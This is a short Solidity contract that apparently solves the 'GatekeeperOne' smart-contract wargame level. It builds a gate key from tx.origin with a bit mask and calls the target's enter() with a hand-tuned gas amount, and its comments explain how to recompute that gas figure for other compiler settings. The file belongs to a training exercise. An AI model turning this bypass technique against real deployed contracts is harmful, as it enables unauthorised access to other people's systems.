// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface IGatekeeperOne {
	function enter(bytes8 gateKey) external returns (bool);
}

contract HackGatekeeperOne {
	IGatekeeperOne private _gatekeeperOne;
    bytes8 private _gateKey;

	constructor(address gatekeeperOne) {
		_gatekeeperOne = IGatekeeperOne(gatekeeperOne);
	}

    function _calculateKey() public view returns (bytes8) {
		bytes8 key = bytes8(uint64(uint160(tx.origin)));
		bytes8 mask = 0xFFFF00000000FFFF;
		return key & mask;
    }

	function attack() public {
		// Gas amount calculation = (8191 * 3) + modifier1GasAmount
		// 256 gas is used in first modifier when using v0.8.12+commit.f00d7308 1000 opts

		// Important: If you want to run this attack on your own, you will need to change the gas amount to match the compiler settings of the 
		//    deployed contract you are trying to attack.
		// For compiler version v0.8.12+commit.f00d7308 with 1000 optimization runs, the gas amount is 24829
		_gatekeeperOne.enter{gas: 24829}(_calculateKey());
	}
}